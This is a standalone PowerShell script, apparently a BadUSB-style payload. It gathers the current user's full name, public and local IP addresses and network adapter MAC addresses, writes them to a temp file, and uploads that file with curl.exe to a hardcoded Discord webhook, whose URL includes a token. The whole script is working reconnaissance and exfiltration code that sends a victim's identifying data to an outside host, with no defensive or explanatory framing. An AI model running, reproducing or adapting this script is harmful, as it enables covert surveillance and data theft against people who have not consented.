$FileName = "$env:tmp/$env:USERNAME-BASICINFO-$(get-date -f yyyy-MM-dd_hh-mm).txt"

function Get-FullName
{
    try
    {
        $FullName = (Get-LocalUser -Name $env:USERNAME).FullName
        return $FullName
    }
    catch
    {
        return "Not found"
    }

}

function Get-PublicIP
{
    try
    {
        $PublicIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
        return $PublicIP
    }
    catch
    {
        return "Not found"
    }
}

function Get-LocalIP
{
    try
    {
        $LocalIP = (Get-NetIPAddress -InterfaceAlias "*Ethernet*", "*WiFi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String).Trim()
        return $LocalIP
    }
    catch
    {
        return "Not found"
    }
}

function Get-MAC
{
    try
    {
        $MAC = (Get-NetAdapter -Name "*Ethernet*","*WiFi*" | Select Name, MacAddress, Status | Out-String).Trim()
        return $MAC
    }
    catch
    {
        return "Not found"
    }
}

function Upload-Discord
{
    [CmdletBinding()]
    param
    (
        [parameter(Position=0, Mandatory=$False)]
        [string]$File,
        [parameter(Position=1, Mandatory=$False)]
        [string]$Text
    )

    $WebhookURL = "https://discord.com/api/webhooks/1109214523799380048/I_6_Ql9RoDkMsYT6CpQeLa0A3nbxtdpyRmoHmQVO6ulwliDSgUXqFul3xI8lzjEQe_Rv"
    $Body = @{
        'username' = $env:USERNAME
        'content' = $Text
    }

    if (-not ([string]::IsNullOrEmpty($Text)))
    {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $WebhookURL -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($File)))
    {
        curl.exe -F "file1=@$File" $WebhookURL
    }
}

$FullName = Get-FullName
$PublicIP = Get-PublicIP
$LocalIP = Get-LocalIP
$MAC = Get-MAC

$Output = @"
-- Basic Info --

Full Name: $FullName

Public IP:
$PublicIP

Local IP:
$LocalIP

MAC:
$MAC
"@

$Output > $FileName

Upload-Discord -File "$FileName"
